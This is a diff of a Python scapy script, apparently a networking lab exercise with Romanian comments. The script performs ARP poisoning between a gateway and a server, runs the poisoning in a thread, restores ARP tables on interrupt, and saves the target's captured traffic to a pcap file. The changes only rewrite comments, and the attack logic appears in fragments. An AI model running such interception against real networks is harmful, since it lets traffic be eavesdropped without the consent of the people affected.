@@ -5,18 +5,13 @@ import sys
 import threading
 import time
 
-#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
-#an ARP reply with MAC Address
-
 # Functia gaseste MAC-ul unui IP trimis prin parametru.
 def get_mac(ip_address):
-    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
-    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
     # Se trimite un packet de nivel 3 
     # cu opcode-ul 1(Request <-> where-is)
     # Mesajul este de tip broadcast -> Se intreaba toate dispozitivele din reteaua
     # locala (hwdst="ff:ff:ff:ff:ff:ff") daca se poate identifica IP-ul (pdst=ip_address)
-    # In caz afirmativ, se va primi un raspuns.
+    # In cazul in care cineva are IP-ul cautat de noi, ne va raspunde cu un packet ARP care va contine MAC-ul sau.
     resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
     for s,r in resp:
         print(f"Raspuns adresa MAC pentru IP-ul {ip_address}: ")
@@ -48,7 +43,7 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
 #in care vom transmite pe rand serverului ca middle este router, 
 #iar routerului ca middle este serverul, schimbul de date fiind "routat"
 #astfel prin middle.
-#Fiecare pachet ARP are hwsrc setat cu MAC-ul containerului middle.
+#Fiecare pachet ARP are hwsrc setat default cu MAC-ul containerului middle.
 def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
     print("[*] Started ARP poison attack [CTRL-C to stop]")
     try:
@@ -67,7 +62,7 @@ def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
             time.sleep(2)
     except KeyboardInterrupt:
         print("[*] Stopped ARP poison attack. Restoring network")
-        #In caz de eroare, aducem legaturile la normal pentru ca serverul sa poata comunica
+        #In caz de oprire de la tastatura, aducem legaturile la normal pentru ca serverul sa poata comunica
         #din nou cu routerul
         restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 
@@ -103,12 +98,10 @@ if target_mac is None:
 else:
     print(f"[*] Adresa MAC obtinuta pentru server: {target_mac}")
 
-#ARP poison thread
 #Otravirea se face intr-un thread pt a nu bloca programul.
 poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
 poison_thread.start()
 
-#Sniff traffic and write to file. Capture is filtered on target machine
 try:
     # Se captureaza tot traficul si se salveaza intr-un fisier .pcap care poate fi citit cu wireshark
     # Se captureaza doar pachetele primite de la target_id (server)
